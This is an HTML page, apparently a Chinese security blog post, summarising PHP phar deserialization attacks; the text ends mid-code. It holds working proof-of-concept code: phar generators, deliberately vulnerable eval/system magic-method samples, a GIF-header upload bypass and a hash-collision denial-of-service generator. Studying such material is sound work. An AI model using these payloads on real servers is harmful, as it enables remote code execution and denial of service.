@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            Phar反序列化总结
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">phar反序列化漏洞的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFphar%E6%96%87%E4%BB%B6%EF%BC%9F%EF%BC%9A"><span class="toc-text">什么是phar文件？：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="toc-text">phar文件的结构：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AAphar%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-text">生成一个phar文件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">漏洞利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%97%E5%BD%B1%E5%93%8D%E7%9A%84%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0"><span class="toc-text">受影响的文件操作函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%AE%9E%E4%BE%8B"><span class="toc-text">漏洞的利用实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%8B%E5%AD%90"><span class="toc-text">一个简单的例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%99%90%E5%88%B6"><span class="toc-text">绕过文件格式限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E5%90%88PHP%E5%86%85%E6%A0%B8%E5%93%88%E5%B8%8C%E8%A1%A8%E7%A2%B0%E6%92%9E%E6%94%BB%E5%87%BB"><span class="toc-text">配合PHP内核哈希表碰撞攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%A3%80%E6%B5%8B%E4%B8%8E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞的检测与修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>除了unserialize()来利用反序列化漏洞之外，还可以利用phar文件以序列化的形式存储用户自定义的meta-data这一特性，扩大php反序列化漏洞的攻击面。该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。</p>
+<p>这次在比赛当中遇到phar反序列化，却不知道如何下手。社区里前面也有人总结过，但没有包括一些ctf利用和zxc师傅发现的姿势。于是就自己来整理了。</p>
+<a id="more"></a>
+
+<h2 id="phar反序列化漏洞的原理"><a href="#phar反序列化漏洞的原理" class="headerlink" title="phar反序列化漏洞的原理"></a>phar反序列化漏洞的原理</h2><h3 id="什么是phar文件？："><a href="#什么是phar文件？：" class="headerlink" title="什么是phar文件？："></a>什么是phar文件？：</h3><p>在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/PHAR_(%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F)">wiki</a></p>
+<p>php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 phar://就是一种内置的流包装器。</p>
+<p>php中一些常见的流包装器如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F; — 访问本地文件系统，在用文件系统函数时默认就使用该包装器</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</span><br><span class="line">zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure>
+
+<p>流包装器的详细内容可以参考<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011474028/article/details/52814049">php流Streams、包装器wrapper 详解</a></p>
+<h3 id="phar文件的结构："><a href="#phar文件的结构：" class="headerlink" title="phar文件的结构："></a>phar文件的结构：</h3><p>phar文件都包含以下几个部分：</p>
+<pre><code>1. stub
+    phar文件的标志，必须以 xxx __HALT_COMPILER();?&gt; 结尾，否则无法识别。xxx可以为自定义内容。
+2. manifest
+    phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。
+3. content
+    被压缩文件的内容
+4. signature (可空)
+    签名，放在末尾。</code></pre>
+<h3 id="生成一个phar文件："><a href="#生成一个phar文件：" class="headerlink" title="生成一个phar文件："></a>生成一个phar文件：</h3><p>php内置了一个phar类来处理相关操作。</p>
+<p>注意：这里要将php.ini里面的<code>phar.readonly</code>选项设置为<code>Off</code>。<code>并把分号去掉。</code></p>
+<p>(如果你在命令行运行PHP文件还是无法生成成功，请使用php -v查看php版本并在修改指定版本的php.ini。)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> TestObject();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行这个php文件，会生成一个phar.phar文件。打开查看可以看到Meta-data的内容是以序列化的形式储存的。</p>
+<p><img src="https://i.loli.net/2019/09/22/rNQLJtSyTK3CfRB.jpg" alt="shengchengpharphp.jpg"></p>
+<p><img src="https://i.loli.net/2019/09/22/RNdEj12gpGFV6Tc.jpg" alt="xuliehua.jpg"></p>
+<p>php在解析这个phar的时候，还会对meta-data数据进行一次反序列化。PHP底层代码：</p>
+<p><img src="https://i.loli.net/2019/09/22/mPxfi6rHndwuJsb.png" alt="phpdiceng.png"></p>
+<p>通过反序列化，我们就能够控制一些类的变量进行利用。</p>
+<h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><ol>
+<li>phar文件要能够上传到服务器端。</li>
+<li>要有可用的魔术方法作为“跳板”。</li>
+<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li>
+</ol>
+<h3 id="受影响的文件操作函数"><a href="#受影响的文件操作函数" class="headerlink" title="受影响的文件操作函数"></a>受影响的文件操作函数</h3><p>知道创宇测试后受影响的函数列表：</p>
+<p><img src="https://i.loli.net/2019/09/22/3ZdtwYQ8MBurxvo.png" alt="affect_function.png"></p>
+<p>但实际并不止这一些。</p>
+<p>参考zxc师傅的文章：<a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></p>
+<p>在跟踪了受影响函数的调用情况后发现，除了所有文件函数，只要是函数的实现过程直接或间接调用了<code>php_stream_open_wrapper</code>。都可能触发phar反序列化漏洞。</p>
+<p>以下这些方式都可触发phar反序列化漏洞：</p>
+<p>exif</p>
+<pre><code>exif_thumbnail
+exif_imagetype</code></pre>
+<p>gd</p>
+<pre><code>imageloadfont
+imagecreatefrom***</code></pre>
+<p>hash</p>
+<pre><code>hash_hmac_file
+hash_file
+hash_update_file
+md5_file
+sha1_file</code></pre>
+<p>file / url</p>
+<pre><code>get_meta_tags
+get_headers</code></pre>
+<p>standard</p>
+<pre><code>getimagesize
+getimagesizefromstring</code></pre>
+<p>zip</p>
+<pre><code>$zip = new ZipArchive();
+$res = $zip-&gt;open(&#39;c.zip&#39;);
+$zip-&gt;extractTo(&#39;phar://test.phar/test&#39;);</code></pre>
+<p>Bzip / Gzip</p>
+<pre><code>当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过
+
+$z = &#39;compress.bzip2://phar:///home/sx/test.phar/test.txt&#39;;
+$z = &#39;compress.zlib://phar:///home/sx/test.phar/test.txt&#39;;</code></pre>
+<p>配合其他协议：(<a target="_blank" rel="noopener" href="https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/">SUCTF</a>)</p>
+<pre><code>当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。
+php://filter/read=convert.base64-encode/resource=phar://phar.phar</code></pre>
+<p>Postgres</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$pdo</span> = <span class="keyword">new</span> PDO(sprintf(<span class="string">&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;postgres&quot;</span>, <span class="string">&quot;sx&quot;</span>, <span class="string">&quot;123456&quot;</span>));</span><br><span class="line">	@<span class="variable">$pdo</span>-&gt;pgsqlCopyFromFile(<span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;phar://phar.phar/aa&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<pre><code>pgsqlCopyToFile和pg_trace同样也是能使用的，需要开启phar的写功能。</code></pre>
+<p>Mysql</p>
+<pre><code>LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper
+
+配置一下mysqld:
+
+[mysqld]
+local-infile=1
+secure_file_priv=&quot;&quot;</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$m</span> = mysqli_init();</span><br><span class="line">mysqli_options(<span class="variable">$m</span>, MYSQLI_OPT_LOCAL_INFILE, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$s</span> = mysqli_real_connect(<span class="variable">$m</span>, <span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;testtable&#x27;</span>, <span class="number">3306</span>);</span><br><span class="line"><span class="variable">$p</span> = mysqli_query(<span class="variable">$m</span>, <span class="string">&#x27;LOAD DATA LOCAL INFILE \&#x27;phar://test.phar/test\&#x27; INTO TABLE a  LINES TERMINATED BY \&#x27;\r\n\&#x27;  IGNORE 1 LINES;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞的利用实例"><a href="#漏洞的利用实例" class="headerlink" title="漏洞的利用实例"></a>漏洞的利用实例</h2><h3 id="一个简单的例子"><a href="#一个简单的例子" class="headerlink" title="一个简单的例子"></a>一个简单的例子</h3><p>phar.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> TestObject();</span><br><span class="line">    <span class="variable">$o</span> -&gt; name=<span class="string">&#x27;Threezh1&#x27;</span>; <span class="comment">//控制TestObject中的name变量为Threezh1</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span> -&gt; name;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])&#123;</span><br><span class="line">	file_exists(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用<code>php phar.php</code>生成<code>phar.phar</code>文件。</p>
+<p>访问：<a target="_blank" rel="noopener" href="http://127.0.0.1/index.php?file=phar://phar.phar">http://127.0.0.1/index.php?file=phar://phar.phar</a></p>
+<p>返回：Threezh1。 反序列化利用成功。</p>
+<p><img src="https://i.loli.net/2019/09/22/5orOZUybpVNTeH1.jpg" alt="example01.jpg"></p>
+<h3 id="绕过文件格式限制"><a href="#绕过文件格式限制" class="headerlink" title="绕过文件格式限制"></a>绕过文件格式限制</h3><ul>
+<li>上传html页面: upload.html</li>
+<li>后端校验页面：upload.php</li>
+<li>一个漏洞页面：index.php  (存在file_exits(), eval()函数)</li>
+<li>一个上传目录： upload_file/</li>
+</ul>
+<p>upload.html:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;upload file&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;upload.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;Upload&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>upload.php</p>
+<p>仅允许格式为gif的文件上传。上传成功的文件会存储到upload_file目录下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(substr(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Temp file: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload_file/&quot;</span> .<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$data</span> = <span class="string">&#x27;echo &quot;Hello World&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])&#123;</span><br><span class="line">	file_exists(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>绕过思路：GIF格式验证可以通过在文件头部添加GIF89a绕过</p>
+<p>我们可以构造一个php来生成phar.phar。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> TestObject();</span><br><span class="line">    <span class="variable">$o</span> -&gt; data=<span class="string">&#x27;phpinfo();&#x27;</span>; <span class="comment">//控制TestObject中的data为phpinfo()。</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用过程：</p>
+<ul>
+<li>一、生成一个phar.phar，修改后缀名为phar.gif</li>
+</ul>
+<p><img src="https://i.loli.net/2019/09/22/CG1DHUlLnFjzv7E.jpg" alt="gifcheck.jpg"></p>
+<ul>
+<li>二、上传到upload_file目录下</li>
+</ul>
+<p><img src="https://i.loli.net/2019/09/22/zJDn7KP8OqZGob2.jpg" alt="uploadgif.jpg"></p>
+<ul>
+<li>三、访问：<a target="_blank" rel="noopener" href="http://127.0.0.1/index.php?file=upload_file/phar.gif">http://127.0.0.1/index.php?file=upload_file/phar.gif</a></li>
+</ul>
+<p><img src="https://i.loli.net/2019/09/22/FerN63qAib2pR1E.jpg" alt="phpinfo.jpg"></p>
+<p>可见已经执行了phpinfo命令了。</p>
+<p>通过修改后缀名和文件头，能够绕过大部分的校验。</p>
+<h3 id="配合PHP内核哈希表碰撞攻击"><a href="#配合PHP内核哈希表碰撞攻击" class="headerlink" title="配合PHP内核哈希表碰撞攻击"></a>配合PHP内核哈希表碰撞攻击</h3><p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2613">https://xz.aliyun.com/t/2613</a></p>
+<p>在PHP内核中，数组是以哈希表的方式实现的，攻击者可以通过巧妙的构造数组元素的key使哈希表退化成单链表（时间复杂度从O(1) =&gt; O(n)）来触发拒绝服务攻击(DDOS)。</p>
+<p>使用 phar.php 生成恶意的phar文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$size</span>= pow(<span class="number">2</span>, <span class="number">16</span>);</span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$key</span> = <span class="number">0</span>, <span class="variable">$maxKey</span> = (<span class="variable">$size</span> - <span class="number">1</span>) * <span class="variable">$size</span>; <span class="variable">$key</span> &lt;= <span class="variable">$maxKey</span>; <span class="variable">$key</span> += <span class="variable">$size</span>) &#123;</span><br><span class="line">    <span class="variable">$array</span>[<span class="variable">$key</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$new_obj</span> = <span class="keyword">new</span> <span 